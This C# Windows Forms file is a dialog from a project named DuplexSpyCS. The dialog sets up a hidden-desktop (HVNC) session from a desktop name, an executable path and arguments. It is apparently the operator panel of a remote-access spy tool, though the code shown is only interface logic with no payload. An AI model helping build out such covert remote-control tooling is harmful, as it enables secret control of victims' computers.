using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmHvncAdd : Form
    {
        private frmHVNC m_fHVNC { get; init; }
        public frmHVNC.stHvncSession m_stConfig { get; set; }

        public frmHvncAdd(frmHVNC fHVNC, frmHVNC.stHvncSession config)
        {
            InitializeComponent();

            m_fHVNC = fHVNC;
            Text = "HVNC Add";
        }

        public frmHvncAdd(frmHVNC fHVNC)
        {
            InitializeComponent();

            m_fHVNC = fHVNC;
            Text = "HVNC Add";
        }

        /// <summary>
        /// Validating desktop name.
        /// </summary>
        /// <param name="szName"></param>
        /// <param name="invalid_char"></param>
        /// <returns></returns>
        bool fnValidation(string szName, out char invalid_char)
        {
            // Invalid chars for naming
            char[] invalid_chars =
            {
                '|', '+', ',',
            };

            foreach (char c in invalid_chars)
            {
                invalid_char = c;

                if (szName.Contains(c))
                    return false;
            }

            invalid_char = '_';

            return true;
        }

        void fnSetup()
        {
            // UI initialization

            var ls = m_fHVNC.fnGetDesktops();
            foreach (string szName in ls)
                comboBox1.Items.Add(szName);


        }

        private void frmHvncAdd_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string szName = comboBox1.Text;
            char invalid_char;
            if (!fnValidation(szName, out invalid_char))
            {
                MessageBox.Show($"Desktop name contains invalid char: {invalid_char}", "Invalid name", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            frmHVNC.stHvncSession session = new frmHVNC.stHvncSession()
            {
                szDesktopName = szName,
                szExeFilePath = textBox2.Text,
                szArguments = textBox3.Text,
            };

            TabPage? page = m_fHVNC.fnAddNewPage(session, false);
            if (page == null)
            {
                MessageBox.Show("Page is null", "NULL", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            session.page = page;

            Close();
        }
    }
}
